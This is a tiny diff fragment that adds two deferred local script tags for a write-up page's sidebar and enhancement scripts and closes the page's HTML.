+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
